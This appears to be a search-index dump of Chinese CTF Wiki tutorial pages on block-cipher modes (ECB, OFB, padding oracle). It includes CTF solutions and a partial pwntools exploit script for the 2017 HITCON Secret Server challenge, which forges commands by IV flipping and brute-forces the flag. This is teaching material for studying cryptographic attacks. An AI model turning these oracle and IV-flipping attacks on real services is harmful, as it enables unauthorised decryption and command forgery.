\u4e3a\u4e86\u89e3\u51b3\u7edf\u4e00\u660e\u6587\u4ea7\u751f\u76f8\u540c\u5bc6\u6587\u7684\u95ee\u9898\uff0c\u63d0\u51fa\u4e86\u5176\u5b83\u7684\u52a0\u5bc6\u6a21\u5f0f\u3002 \u5178\u578b\u5e94\u7528 \u00b6 \u7528\u4e8e\u968f\u673a\u6570\u7684\u52a0\u5bc6\u4fdd\u62a4\u3002 \u7528\u4e8e\u5355\u5206\u7ec4\u660e\u6587\u7684\u52a0\u5bc6\u3002 2016 ABCTF aes-mess-75 \u00b6 \u9898\u76ee\u63cf\u8ff0\u5982\u4e0b We encrypted a flag with AES-ECB encryption using a secret key, and got the hash: e220eb994c8fc16388dbd60a969d4953f042fc0bce25dbef573cf522636a1ba3fafa1a7c21ff824a5824c5dc4a376e75 However, we lost our plaintext flag and also lost our key and we can't seem to decrypt the hash back :(. Luckily we encrypted a bunch of other flags with the same key. Can you recover the lost flag using this? [HINT] There has to be some way to work backwards, right? \u53ef\u4ee5\u770b\u51fa\uff0c\u8fd9\u4e2a\u52a0\u5bc6\u662f\u4e00\u4e2a ECB \u52a0\u5bc6\uff0c\u7136\u540e AES \u662f 16 \u4e2a\u5b57\u8282\u4e00\u7ec4\uff0c\u6bcf\u4e2a\u5b57\u8282\u53ef\u4ee5\u4f7f\u7528\u4e24\u4e2a 16 \u8fdb\u5236\u5b57\u7b26\u8868\u793a\uff0c\u56e0\u6b64\uff0c\u6211\u4eec\u6bcf 32 \u4e2a\u5b57\u7b26\u4e00\u7ec4\u8fdb\u884c\u5206\u7ec4\uff0c\u7136\u540e\u53bb\u5bf9\u5e94\u7684 txt \u6587\u4ef6\u4e2d\u641c\u7d22\u5373\u53ef\u3002 \u5bf9\u5e94 flag e220eb994c8fc16388dbd60a969d4953 abctf{looks_like f042fc0bce25dbef573cf522636a1ba3 _you_can_break_a fafa1a7c21ff824a5824c5dc4a376e75 es} \u6700\u540e\u4e00\u4e2a\u663e\u7136\u5728\u52a0\u5bc6\u65f6\u8fdb\u884c\u4e86 padding\u3002 \u9898\u76ee \u00b6 2018 PlaidCTF macsh","title":"ECB"},{"location":"crypto/blockcipher/mode/ecb/#ecb","text":"ECB\u6a21\u5f0f\u5168\u79f0\u4e3a\u7535\u5b50\u5bc6\u7801\u672c\u6a21\u5f0f\uff08Electronic codebook\uff09\u3002","title":"ECB"},{"location":"crypto/blockcipher/mode/ecb/#_1","text":"","title":"\u52a0\u5bc6"},{"location":"crypto/blockcipher/mode/ecb/#_2","text":"","title":"\u89e3\u5bc6"},{"location":"crypto/blockcipher/mode/ecb/#_3","text":"","title":"\u4f18\u7f3a\u70b9"},{"location":"crypto/blockcipher/mode/ecb/#_4","text":"\u5b9e\u73b0\u7b80\u5355\u3002 \u4e0d\u540c\u660e\u6587\u5206\u7ec4\u7684\u52a0\u5bc6\u53ef\u4ee5\u5e76\u884c\u8ba1\u7b97\uff0c\u901f\u5ea6\u5f88\u5feb\u3002","title":"\u4f18\u70b9"},{"location":"crypto/blockcipher/mode/ecb/#_5","text":"\u540c\u6837\u7684\u660e\u6587\u5757\u4f1a\u88ab\u52a0\u5bc6\u6210\u76f8\u540c\u7684\u5bc6\u6587\u5757\uff0c\u4e0d\u4f1a\u9690\u85cf\u660e\u6587\u5206\u7ec4\u7684\u7edf\u8ba1\u89c4\u5f8b\u3002\u6b63\u5982\u4e0b\u56fe\u6240\u793a \u4e3a\u4e86\u89e3\u51b3\u7edf\u4e00\u660e\u6587\u4ea7\u751f\u76f8\u540c\u5bc6\u6587\u7684\u95ee\u9898\uff0c\u63d0\u51fa\u4e86\u5176\u5b83\u7684\u52a0\u5bc6\u6a21\u5f0f\u3002","title":"\u7f3a\u70b9"},{"location":"crypto/blockcipher/mode/ecb/#_6","text":"\u7528\u4e8e\u968f\u673a\u6570\u7684\u52a0\u5bc6\u4fdd\u62a4\u3002 \u7528\u4e8e\u5355\u5206\u7ec4\u660e\u6587\u7684\u52a0\u5bc6\u3002","title":"\u5178\u578b\u5e94\u7528"},{"location":"crypto/blockcipher/mode/ecb/#2016-abctf-aes-mess-75","text":"\u9898\u76ee\u63cf\u8ff0\u5982\u4e0b We encrypted a flag with AES-ECB encryption using a secret key, and got the hash: e220eb994c8fc16388dbd60a969d4953f042fc0bce25dbef573cf522636a1ba3fafa1a7c21ff824a5824c5dc4a376e75 However, we lost our plaintext flag and also lost our key and we can't seem to decrypt the hash back :(. Luckily we encrypted a bunch of other flags with the same key. Can you recover the lost flag using this? [HINT] There has to be some way to work backwards, right? \u53ef\u4ee5\u770b\u51fa\uff0c\u8fd9\u4e2a\u52a0\u5bc6\u662f\u4e00\u4e2a ECB \u52a0\u5bc6\uff0c\u7136\u540e AES \u662f 16 \u4e2a\u5b57\u8282\u4e00\u7ec4\uff0c\u6bcf\u4e2a\u5b57\u8282\u53ef\u4ee5\u4f7f\u7528\u4e24\u4e2a 16 \u8fdb\u5236\u5b57\u7b26\u8868\u793a\uff0c\u56e0\u6b64\uff0c\u6211\u4eec\u6bcf 32 \u4e2a\u5b57\u7b26\u4e00\u7ec4\u8fdb\u884c\u5206\u7ec4\uff0c\u7136\u540e\u53bb\u5bf9\u5e94\u7684 txt \u6587\u4ef6\u4e2d\u641c\u7d22\u5373\u53ef\u3002 \u5bf9\u5e94 flag e220eb994c8fc16388dbd60a969d4953 abctf{looks_like f042fc0bce25dbef573cf522636a1ba3 _you_can_break_a fafa1a7c21ff824a5824c5dc4a376e75 es} \u6700\u540e\u4e00\u4e2a\u663e\u7136\u5728\u52a0\u5bc6\u65f6\u8fdb\u884c\u4e86 padding\u3002","title":"2016 ABCTF aes-mess-75"},{"location":"crypto/blockcipher/mode/ecb/#_7","text":"2018 PlaidCTF macsh","title":"\u9898\u76ee"},{"location":"crypto/blockcipher/mode/introduction/","text":"\u5206\u7ec4\u6a21\u5f0f \u00b6 \u5206\u7ec4\u52a0\u5bc6\u4f1a\u5c06\u660e\u6587\u6d88\u606f\u5212\u5206\u4e3a\u56fa\u5b9a\u5927\u5c0f\u7684\u5757\uff0c\u6bcf\u5757\u660e\u6587\u5206\u522b\u5728\u5bc6\u94a5\u63a7\u5236\u4e0b\u52a0\u5bc6\u4e3a\u5bc6\u6587\u3002\u5f53\u7136\u5e76\u4e0d\u662f\u6bcf\u4e2a\u6d88\u606f\u90fd\u662f\u76f8\u5e94\u5757\u5927\u5c0f\u7684\u6574\u6570\u500d\uff0c\u6240\u4ee5\u6211\u4eec\u53ef\u80fd\u9700\u8981\u8fdb\u884c\u586b\u5145\u3002","title":"\u5206\u7ec4\u6a21\u5f0f"},{"location":"crypto/blockcipher/mode/introduction/#_1","text":"\u5206\u7ec4\u52a0\u5bc6\u4f1a\u5c06\u660e\u6587\u6d88\u606f\u5212\u5206\u4e3a\u56fa\u5b9a\u5927\u5c0f\u7684\u5757\uff0c\u6bcf\u5757\u660e\u6587\u5206\u522b\u5728\u5bc6\u94a5\u63a7\u5236\u4e0b\u52a0\u5bc6\u4e3a\u5bc6\u6587\u3002\u5f53\u7136\u5e76\u4e0d\u662f\u6bcf\u4e2a\u6d88\u606f\u90fd\u662f\u76f8\u5e94\u5757\u5927\u5c0f\u7684\u6574\u6570\u500d\uff0c\u6240\u4ee5\u6211\u4eec\u53ef\u80fd\u9700\u8981\u8fdb\u884c\u586b\u5145\u3002","title":"\u5206\u7ec4\u6a21\u5f0f"},{"location":"crypto/blockcipher/mode/ofb/","text":"OFB \u00b6 OFB\u5168\u79f0\u4e3a\u8f93\u51fa\u53cd\u9988\u6a21\u5f0f\uff08Output feedback\uff09\uff0c\u5176\u53cd\u9988\u5185\u5bb9\u662f\u5206\u7ec4\u52a0\u5bc6\u540e\u7684\u5185\u5bb9\u800c\u4e0d\u662f\u5bc6\u6587\u3002 \u52a0\u5bc6 \u00b6 \u89e3\u5bc6 \u00b6 \u4f18\u7f3a\u70b9 \u00b6 \u4f18\u70b9 \u00b6 \u4e0d\u5177\u6709\u9519\u8bef\u4f20\u64ad\u7279\u6027\u3002 \u7f3a\u70b9 \u00b6 IV \u65e0\u9700\u4fdd\u5bc6\uff0c\u4f46\u662f\u5bf9\u6bcf\u4e2a\u6d88\u606f\u5fc5\u987b\u9009\u62e9\u4e0d\u540c\u7684 IV\u3002 \u4e0d\u5177\u6709\u81ea\u540c\u6b65\u80fd\u529b\u3002 \u9002\u7528\u573a\u666f \u00b6 \u9002\u7528\u4e8e\u4e00\u4e9b\u660e\u6587\u5197\u4f59\u5ea6\u6bd4\u8f83\u5927\u7684\u573a\u666f\uff0c\u5982\u56fe\u50cf\u52a0\u5bc6\u548c\u8bed\u97f3\u52a0\u5bc6\u3002","title":"OFB"},{"location":"crypto/blockcipher/mode/ofb/#ofb","text":"OFB\u5168\u79f0\u4e3a\u8f93\u51fa\u53cd\u9988\u6a21\u5f0f\uff08Output feedback\uff09\uff0c\u5176\u53cd\u9988\u5185\u5bb9\u662f\u5206\u7ec4\u52a0\u5bc6\u540e\u7684\u5185\u5bb9\u800c\u4e0d\u662f\u5bc6\u6587\u3002","title":"OFB"},{"location":"crypto/blockcipher/mode/ofb/#_1","text":"","title":"\u52a0\u5bc6"},{"location":"crypto/blockcipher/mode/ofb/#_2","text":"","title":"\u89e3\u5bc6"},{"location":"crypto/blockcipher/mode/ofb/#_3","text":"","title":"\u4f18\u7f3a\u70b9"},{"location":"crypto/blockcipher/mode/ofb/#_4","text":"\u4e0d\u5177\u6709\u9519\u8bef\u4f20\u64ad\u7279\u6027\u3002","title":"\u4f18\u70b9"},{"location":"crypto/blockcipher/mode/ofb/#_5","text":"IV \u65e0\u9700\u4fdd\u5bc6\uff0c\u4f46\u662f\u5bf9\u6bcf\u4e2a\u6d88\u606f\u5fc5\u987b\u9009\u62e9\u4e0d\u540c\u7684 IV\u3002 \u4e0d\u5177\u6709\u81ea\u540c\u6b65\u80fd\u529b\u3002","title":"\u7f3a\u70b9"},{"location":"crypto/blockcipher/mode/ofb/#_6","text":"\u9002\u7528\u4e8e\u4e00\u4e9b\u660e\u6587\u5197\u4f59\u5ea6\u6bd4\u8f83\u5927\u7684\u573a\u666f\uff0c\u5982\u56fe\u50cf\u52a0\u5bc6\u548c\u8bed\u97f3\u52a0\u5bc6\u3002","title":"\u9002\u7528\u573a\u666f"},{"location":"crypto/blockcipher/mode/padding-oracle-attack/","text":"Padding Oracle Attack \u00b6 \u4ecb\u7ecd \u00b6 Padding Oracle Attack \u653b\u51fb\u4e00\u822c\u9700\u8981\u6ee1\u8db3\u4ee5\u4e0b\u51e0\u4e2a\u6761\u4ef6 \u52a0\u5bc6\u7b97\u6cd5 \u91c7\u7528 PKCS5 Padding \u7684\u52a0\u5bc6\u7b97\u6cd5\u3002 \u5f53\u7136\uff0c\u975e\u5bf9\u79f0\u52a0\u5bc6\u4e2d OAEP \u7684\u586b\u5145\u65b9\u5f0f\u4e5f\u6709\u53ef\u80fd\u4f1a\u53d7\u5230\u5f71\u54cd\u3002 \u5206\u7ec4\u6a21\u5f0f\u4e3a CBC \u6a21\u5f0f\u3002 \u653b\u51fb\u8005\u80fd\u529b \u653b\u51fb\u8005\u53ef\u4ee5\u62e6\u622a\u4e0a\u8ff0\u52a0\u5bc6\u7b97\u6cd5\u52a0\u5bc6\u7684\u6d88\u606f\u3002 \u653b\u51fb\u8005\u53ef\u4ee5\u548c padding oracle\uff08\u5373\u670d\u52a1\u5668\uff09 \u8fdb\u884c\u4ea4\u4e92\uff1a\u5ba2\u6237\u7aef\u5411\u670d\u52a1\u5668\u7aef\u53d1\u9001\u5bc6\u6587\uff0c\u670d\u52a1\u5668\u7aef\u4f1a\u4ee5\u67d0\u79cd\u8fd4\u56de\u4fe1\u606f\u544a\u77e5\u5ba2\u6237\u7aef padding \u662f\u5426\u6b63\u5e38\u3002 Padding Oracle Attack \u653b\u51fb\u53ef\u4ee5\u8fbe\u5230\u7684\u6548\u679c\u5982\u4e0b \u5728\u4e0d\u6e05\u695a key \u548c IV \u7684\u524d\u63d0\u4e0b\u89e3\u5bc6\u4efb\u610f\u7ed9\u5b9a\u7684\u5bc6\u6587\u3002 \u539f\u7406 \u00b6 Padding Oracle Attack \u653b\u51fb\u7684\u57fa\u672c\u539f\u7406\u5982\u4e0b \u5bf9\u4e8e\u5f88\u957f\u7684\u6d88\u606f\u4e00\u5757\u4e00\u5757\u89e3\u5bc6\u3002 \u5bf9\u4e8e\u6bcf\u4e00\u5757\u6d88\u606f\uff0c\u5148\u89e3\u5bc6\u6d88\u606f\u7684\u6700\u540e\u4e00\u4e2a\u5b57\u8282\uff0c\u7136\u540e\u89e3\u5bc6\u5012\u6570\u7b2c\u4e8c\u4e2a\u5b57\u8282\uff0c\u4f9d\u6b21\u7c7b\u63a8\u3002 \u8fd9\u91cc\u6211\u4eec\u56de\u987e\u4e00\u4e0b CBC \u7684 \u52a0\u5bc6 C_i=E_K(P_i \\oplus C_{i-1})\\\\ C_0=IV C_i=E_K(P_i \\oplus C_{i-1})\\\\ C_0=IV \u89e3\u5bc6 P_{i}=D_{K}(C_{i})\\oplus C_{i-1}\\\\ C_{0}=IV P_{i}=D_{K}(C_{i})\\oplus C_{i-1}\\\\ C_{0}=IV \u6211\u4eec\u4e3b\u8981\u5173\u6ce8\u4e8e\u89e3\u5bc6\uff0c\u8fd9\u91cc\u6211\u4eec\u5e76\u4e0d\u77e5\u9053 IV \u548c key\u3002\u8fd9\u91cc\u6211\u4eec\u5047\u8bbe\u5bc6\u6587\u5757\u7684\u957f\u5ea6\u4e3a n \u4e2a\u5b57\u8282\u3002 \u5047\u8bbe\u6211\u4eec\u622a\u83b7\u4e86\u5bc6\u6587 Y\uff0c\u4ee5\u83b7\u53d6\u5bc6\u6587 Y \u7684\u6700\u540e\u4e00\u4e2a\u5b57\u8282\u4e3a\u4f8b\u5b50\u8fdb\u884c\u5206\u6790\u3002\u4e3a\u4e86\u83b7\u53d6 Y \u7684\u5185\u5bb9\uff0c\u6211\u4eec\u9996\u5148\u9700\u8981\u4f2a\u9020\u4e00\u5757\u5bc6\u6587 F \u4ee5\u4fbf\u4e8e\u53ef\u4ee5\u4fee\u6539 Y \u5bf9\u5e94\u660e\u6587\u7684\u6700\u540e\u4e00\u4e2a\u5b57\u8282\u3002\u8fd9\u662f\u56e0\u4e3a\u82e5\u6211\u4eec\u6784\u9020\u5bc6\u6587 F|Y \uff0c\u90a3\u4e48\u89e3\u5bc6 Y \u65f6\u5177\u4f53\u4e3a P=D_K(Y)\\oplus F P=D_K(Y)\\oplus F \uff0c\u6240\u4ee5\u4fee\u6539\u5bc6\u6587 F \u7684\u6700\u540e\u4e00\u4e2a\u5b57\u8282 F_{n} F_{n} \u53ef\u4ee5\u4fee\u6539 Y \u5bf9\u5e94\u7684\u660e\u6587\u7684\u6700\u540e\u4e00\u4e2a\u5b57\u8282\u3002\u4e0b\u9762\u7ed9\u51fa\u83b7\u53d6 P \u6700\u540e\u4e00\u4e2a\u5b57\u8282\u7684\u8fc7\u7a0b i=0\uff0c\u8bbe\u7f6e F \u7684\u6bcf\u4e2a\u5b57\u8282\u4e3a \u968f\u673a\u5b57\u8282 \u3002 \u8bbe\u7f6e F_n=i \\oplus 0x01 F_n=i \\oplus 0x01 \u5c06 F|Y \u53d1\u9001\u7ed9\u670d\u52a1\u5668\uff0c\u5982\u679c P \u7684\u6700\u540e\u4e00\u4e2a\u5b57\u8282\u662f i \u7684\u8bdd\uff0c\u90a3\u4e48\u6700\u540e\u7684 padding \u5c31\u662f 0x01\uff0c\u4e0d\u4f1a\u51fa\u73b0\u9519\u8bef\u3002\u5426\u5219\uff0c\u53ea\u6709 P \u7684\u6700\u540e P_n \\oplus i \\oplus 0x01 P_n \\oplus i \\oplus 0x01 \u5b57\u8282\u90fd\u662f P_n \\oplus i \\oplus 0x01 P_n \\oplus i \\oplus 0x01 \u624d\u4e0d\u4f1a\u62a5\u9519\u3002 \u800c\u4e14\uff0c\u9700\u8981\u6ce8\u610f\u7684\u662f padding \u7684\u5b57\u8282\u53ea\u80fd\u662f 0 \u5230 n\u3002 \u56e0\u6b64\uff0c\u82e5\u60f3\u8981\u4f7f\u5f97\u5728 F \u968f\u673a\u5730\u60c5\u51b5\u4e0b\uff0c\u5e76\u4e14\u6ee1\u8db3padding \u5b57\u8282\u5927\u5c0f\u7684\u7ea6\u675f\u60c5\u51b5\u4e0b\u8fd8\u4e0d\u62a5\u9519 \u6982\u7387\u5f88\u5c0f \u3002\u6240\u4ee5\u5728\u670d\u52a1\u5668\u7aef\u4e0d\u62a5\u9519\u7684\u60c5\u51b5\u4e0b\uff0c\u6211\u4eec\u53ef\u4ee5\u8ba4\u4e3a\u6211\u4eec\u786e\u5b9e\u83b7\u53d6\u4e86\u6b63\u786e\u7684\u5b57\u8282\u3002 \u5728\u51fa\u73b0\u9519\u8bef\u7684\u60c5\u51b5\u4e0b\uff0ci=i+1\uff0c\u8df3\u8f6c\u52302\u3002 \u5f53\u83b7\u53d6\u4e86 P \u7684\u6700\u540e\u4e00\u4e2a\u5b57\u8282\u540e\uff0c\u6211\u4eec\u53ef\u4ee5\u7ee7\u7eed\u83b7\u53d6 P \u7684\u5012\u6570\u7b2c\u4e8c\u4e2a\u5b57\u8282\uff0c\u6b64\u65f6\u9700\u8981\u8bbe\u7f6e F_n=P_n\\oplus 0x02 F_n=P_n\\oplus 0x02 \uff0c\u540c\u65f6\u8bbe\u7f6e F_{n-1}=i \\oplus 0x02 F_{n-1}=i \\oplus 0x02 \u53bb\u679a\u4e3e i\u3002 \u6240\u4ee5\uff0c\u7efc\u4e0a\u6240\u793a\uff0cPadding Oracle Attack \u5176\u5b9e\u5728\u4e00\u5b9a\u7a0b\u5ea6\u4e0a\u662f\u4e00\u79cd\u5177\u6709\u5f88\u5927\u6982\u7387\u6210\u529f\u7684\u653b\u51fb\u65b9\u6cd5\u3002 \u7136\u800c\uff0c\u9700\u8981\u6ce8\u610f\u7684\u662f\uff0c\u5f80\u5f80\u9047\u5230\u7684\u4e00\u4e9b\u73b0\u5b9e\u95ee\u9898\u5e76\u4e0d\u662f\u6807\u51c6\u7684 Padding Oracle Attack \u6a21\u5f0f\uff0c\u6211\u4eec\u5f80\u5f80\u9700\u8981\u8fdb\u884c\u4e00\u4e9b\u53d8\u5f62\u3002 2017 HITCON Secret Server \u00b6 \u5206\u6790 \u00b6 \u7a0b\u5e8f\u4e2d\u91c7\u7528\u7684\u52a0\u5bc6\u662f AES CBC\uff0c\u5176\u4e2d\u91c7\u7528\u7684 padding \u4e0e PKCS5 \u7c7b\u4f3c def pad ( msg ): pad_length = 16 - len ( msg ) % 16 return msg + chr ( pad_length ) * pad_length def unpad ( msg ): return msg [: - ord ( msg [ - 1 ])] \u4f46\u662f\uff0c\u5728\u6bcf\u6b21 unpad \u65f6\u5e76\u6ca1\u6709\u8fdb\u884c\u68c0\u6d4b\uff0c\u800c\u662f\u76f4\u63a5\u8fdb\u884c unpad\u3002 \u5176\u4e2d\uff0c\u9700\u8981\u6ce8\u610f\u7684\u662f\uff0c\u6bcf\u6b21\u548c\u7528\u6237\u4ea4\u4e92\u7684\u51fd\u6570\u662f send_msg \uff0c\u63a5\u53d7\u7528\u6237\u7684\u660e\u6587\uff0c\u4f7f\u7528\u56fa\u5b9a\u7684 2jpmLoSsOlQrqyqE \u4f5c\u4e3a IV\uff0c\u8fdb\u884c\u52a0\u5bc6\uff0c\u5e76\u5c06\u52a0\u5bc6\u7ed3\u679c\u8f93\u51fa\u3002 recv_msg \uff0c\u63a5\u53d7\u7528\u6237\u7684 IV \u548c\u5bc6\u6587\uff0c\u5bf9\u5bc6\u6587\u8fdb\u884c\u89e3\u5bc6\uff0c\u5e76\u8fd4\u56de\u3002\u6839\u636e\u8fd4\u56de\u7684\u7ed3\u679c\u4f1a\u6709\u4e0d\u540c\u7684\u64cd\u4f5c msg = recv_msg () . strip () if msg . startswith ( 'exit-here' ): exit ( 0 ) elif msg . startswith ( 'get-flag' ): send_msg ( flag ) elif msg . startswith ( 'get-md5' ): send_msg ( MD5 . new ( msg [ 7 :]) . digest ()) elif msg . startswith ( 'get-time' ): send_msg ( str ( time . time ())) elif msg . startswith ( 'get-sha1' ): send_msg ( SHA . new ( msg [ 8 :]) . digest ()) elif msg . startswith ( 'get-sha256' ): send_msg ( SHA256 . new ( msg [ 10 :]) . digest ()) elif msg . startswith ( 'get-hmac' ): send_msg ( HMAC . new ( msg [ 8 :]) . digest ()) else : send_msg ( 'command not found' ) \u4e3b\u8981\u6f0f\u6d1e \u00b6 \u8fd9\u91cc\u6211\u4eec\u518d\u7b80\u5355\u603b\u7ed3\u4e00\u4e0b\u6211\u4eec\u5df2\u6709\u7684\u90e8\u5206 \u52a0\u5bc6 \u52a0\u5bc6\u65f6\u7684 IV \u662f\u56fa\u5b9a\u7684\u800c\u4e14\u5df2\u77e5\u3002 'Welcome!!' \u52a0\u5bc6\u540e\u7684\u7ed3\u679c\u3002 \u89e3\u5bc6 \u6211\u4eec\u53ef\u4ee5\u63a7\u5236 IV\u3002 \u9996\u5148\uff0c\u65e2\u7136\u6211\u4eec\u77e5\u9053 Welcome!! \u52a0\u5bc6\u540e\u7684\u7ed3\u679c\uff0c\u8fd8\u53ef\u4ee5\u63a7\u5236 recv_msg \u4e2d\u7684 IV\uff0c\u90a3\u4e48\u6839\u636e\u89e3\u5bc6\u8fc7\u7a0b P_{i}=D_{K}(C_{i})\\oplus C_{i-1}\\\\ C_{0}=IV P_{i}=D_{K}(C_{i})\\oplus C_{i-1}\\\\ C_{0}=IV \u5982\u679c\u6211\u4eec\u5c06 Welcome!! \u52a0\u5bc6\u540e\u7684\u7ed3\u679c\u8f93\u5165\u7ed9 recv_msg\uff0c\u90a3\u4e48\u76f4\u63a5\u89e3\u5bc6\u540e\u7684\u7ed3\u679c\u4fbf\u662f \uff08Welcome!!+'\\x07'*7) xor iv \uff0c\u5982\u679c\u6211\u4eec \u6070\u5f53\u7684\u63a7\u5236\u89e3\u5bc6\u8fc7\u7a0b\u4e2d\u4f20\u9012\u7684 iv \uff0c\u90a3\u4e48\u6211\u4eec\u5c31\u53ef\u4ee5\u63a7\u5236\u89e3\u5bc6\u540e\u7684\u7ed3\u679c\u3002\u4e5f\u5c31\u662f\u8bf4\u6211\u4eec\u53ef\u4ee5\u6267\u884c \u4e0a\u8ff0\u6240\u8bf4\u7684\u4efb\u610f\u547d\u4ee4 \u3002\u4ece\u800c\uff0c\u6211\u4eec\u4e5f\u5c31\u53ef\u4ee5\u77e5\u9053 flag \u89e3\u5bc6\u540e\u7684\u7ed3\u679c\u3002 \u5176\u6b21\uff0c\u5728\u4e0a\u9762\u7684\u57fa\u7840\u4e4b\u4e0a\uff0c\u5982\u679c\u6211\u4eec\u5728\u4efb\u4f55\u5bc6\u6587 C \u540e\u9762\u6dfb\u52a0\u81ea\u5b9a\u4e49\u7684 IV \u548c Welcome \u52a0\u5bc6\u540e\u7684\u7ed3\u679c\uff0c\u4f5c\u4e3a\u8f93\u5165\u4f20\u9012\u7ed9 recv_msg\uff0c\u90a3\u4e48\u6211\u4eec\u4fbf\u53ef\u4ee5\u63a7\u5236\u89e3\u5bc6\u4e4b\u540e\u7684\u6d88\u606f\u7684\u6700\u540e\u4e00\u4e2a\u5b57\u8282\uff0c \u90a3\u4e48\u7531\u4e8e unpad \u64cd\u4f5c\uff0c\u6211\u4eec\u4fbf\u53ef\u4ee5\u63a7\u5236\u89e3\u5bc6\u540e\u7684\u6d88\u606f\u7684\u957f\u5ea6\u51cf\u5c0f 0 \u5230 255 \u3002 \u5229\u7528\u601d\u8def \u00b6 \u57fa\u672c\u5229\u7528\u601d\u8def\u5982\u4e0b \u7ed5\u8fc7 proof of work \u6839\u636e\u6267\u884c\u4efb\u610f\u547d\u4ee4\u7684\u65b9\u5f0f\u83b7\u53d6\u52a0\u5bc6\u540e\u7684 flag\u3002 \u7531\u4e8e flag \u7684\u5f00\u5934\u662f hitcon{ \uff0c\u4e00\u5171\u67097\u4e2a\u5b57\u8282\uff0c\u6240\u4ee5\u6211\u4eec\u4efb\u7136\u53ef\u4ee5\u901a\u8fc7\u63a7\u5236 iv \u6765\u4f7f\u5f97\u89e3\u5bc6\u540e\u7684\u524d 7 \u4e2a\u5b57\u8282\u4e3a\u6307\u5b9a\u5b57\u8282\u3002\u8fd9\u4f7f\u5f97\u6211\u4eec\u53ef\u4ee5\u5bf9\u4e8e\u89e3\u5bc6\u540e\u7684\u6d88\u606f\u6267\u884c get-md5 \u547d\u4ee4\u3002\u800c\u6839\u636e unpad \u64cd\u4f5c\uff0c\u6211\u4eec\u53ef\u4ee5\u63a7\u5236\u89e3\u5bc6\u540e\u7684\u6d88\u606f\u6070\u597d\u5728\u6d88\u606f\u7684\u7b2c\u51e0\u4e2a\u5b57\u8282\u5904\u3002\u6240\u4ee5\u6211\u4eec\u53ef\u4ee5\u5f00\u59cb\u65f6\u5c06\u63a7\u5236\u89e3\u5bc6\u540e\u7684\u6d88\u606f\u4e3a hitcon{x \uff0c\u5373\u53ea\u4fdd\u7559 hitcon{ \u540e\u7684\u4e00\u4e2a\u5b57\u8282\u3002\u8fd9\u6837\u4fbf\u53ef\u4ee5\u83b7\u5f97\u5e26\u4e00\u4e2a\u5b57\u8282\u54c8\u5e0c\u540e\u7684\u52a0\u5bc6\u7ed3\u679c\u3002\u7c7b\u4f3c\u5730\uff0c\u6211\u4eec\u4e5f\u53ef\u4ee5\u83b7\u5f97\u5e26\u5236\u5b9a\u4e2a\u5b57\u8282\u54c8\u5e0c\u540e\u7684\u52a0\u5bc6\u7ed3\u679c\u3002 \u8fd9\u6837\u7684\u8bdd\uff0c\u6211\u4eec\u53ef\u4ee5\u5728\u672c\u5730\u9010\u5b57\u8282\u7206\u7834\uff0c\u8ba1\u7b97\u5bf9\u5e94 md5 \uff0c\u7136\u540e\u518d\u6b21\u5229\u7528\u4efb\u610f\u547d\u4ee4\u6267\u884c\u7684\u65b9\u5f0f\uff0c\u63a7\u5236\u89e3\u5bc6\u540e\u7684\u660e\u6587\u4e3a\u4efb\u610f\u6307\u5b9a\u547d\u4ee4\uff0c\u5982\u679c\u63a7\u5236\u4e0d\u6210\u529f\uff0c\u90a3\u8bf4\u660e\u8be5\u5b57\u8282\u4e0d\u5bf9\uff0c\u9700\u8981\u518d\u6b21\u7206\u7834\uff1b\u5982\u679c\u6b63\u786e\uff0c\u90a3\u4e48\u5c31\u53ef\u4ee5\u76f4\u63a5\u6267\u884c\u5bf9\u5e94\u7684\u547d\u4ee4\u3002 \u5177\u4f53\u4ee3\u7801\u5982\u4e0b #coding=utf-8 from pwn import * import base64 , time , random , string from Crypto.Cipher import AES from Crypto.Hash import SHA256 , MD5 #context.log_level = 'debug' if args [ 'REMOTE' ]: p = remote ( '52.193.157.19' , 9999 ) else : p = remote ( '127.0.0.1' , 7777 ) def strxor ( str1 , str2 ): return '' . join ([ chr ( ord ( c1 ) ^ ord ( c2 )) for c1 , c2 in zip ( str1 , str2 )]) def pad ( msg ): pad_length = 16 - len ( msg ) % 16 return msg + chr ( pad_length ) * pad_length def unpad ( msg ): return msg [: - ord ( msg [ - 1 ])] # \u53bb\u6389pad def flipplain ( oldplain , newplain , iv ): \"\"\"flip oldplain to new plain, return proper iv\"\"\" return strxor ( strxor ( oldplain , newplain ), iv ) def bypassproof (): p . recvuntil ( 'SHA256(XXXX+' ) lastdata = p . recvuntil ( ')' , drop = True ) p . recvuntil ( ' == ' ) digest = p . recvuntil ( ' \\n Give me XXXX:' , drop = True ) def proof ( s ): return SHA256 . new ( s + lastdata ) . hexdigest () == digest data = pwnlib . util . iters . mbruteforce ( proof , string . ascii_letters + string . digits , 4 , method = 'fixed' ) p . sendline ( data ) p . recvuntil ( 'Done! \\n ' ) iv_encrypt = '2jpmLoSsOlQrqyqE' def getmd5enc ( i , cipher_flag , cipher_welcome ): \"\"\"return encrypt( md5( flag[7:7+i] ) )\"\"\" ## keep iv[7:] do not change, so decrypt won't change new_iv = flipplain ( \"hitcon{\" . ljust ( 16 , ' \\x00 ' ), \"get-md5\" . ljust ( 16 , ' \\x00 ' ), iv_encrypt ) payload = new_iv + cipher_flag ## calculate the proper last byte number last_byte_iv = flipplain ( pad ( \"Welcome!!\" ), \"a\" * 15 + chr ( len ( cipher_flag ) + 16 + 16 - ( 7 + i + 1 )), iv_encrypt ) payload += last_byte_iv + cipher_welcome p . sendline ( base64 . b64encode ( payload )) return p . recvuntil ( \" \\n \" , drop = True ) def main (): bypassproof () # result of encrypted Welcome!! cipher = p . recvuntil ( ' \\n ' , drop = True ) cipher_welcome = base64 . b64decode ( cipher )[ 16 :] log . info ( \"cipher welcome is : \" + cipher_welcome ) # execute get-flag get_flag_iv = flipplain ( pad ( \"Welcome!!\" ), pad ( \"get-flag\" ), iv_encrypt ) payload = base64 . b64encode ( get_flag_iv + cipher_welcome ) p . sendline ( payload ) cipher = p . recvuntil ( ' \\n ' , drop = True ) cipher_flag = base64 . b64decode ( cipher )[ 16 :] flaglen = len ( cipher_flag ) log . info ( \"cipher flag is : \" + cipher_flag ) # get command not found cipher p . sendline ( base64 . b64encode ( iv_encrypt + cipher_welcome )) cipher_notfound = p . recvuntil ( ' \\n ' , drop = True ) flag = \"\" # brute force for every byte of flag for i in range ( flaglen - 7 ): md5_indexi = getmd5enc ( i , cipher_flag , cipher_welcome ) md5_indexi = base64 . b64decode ( md5_indexi )[ 16 :] log . info ( \"get encrypt(md5(flag[7:7+i])): \" + md5_indexi ) for guess in range ( 256 ): # locally compute md5 hash guess_md5 = MD5 . new ( flag + chr ( guess )) . digest () # try to null out the md5 plaintext and execute a command payload = flipplain ( guess_md5 , 'get-time' . ljust ( 16 , ' \\x01 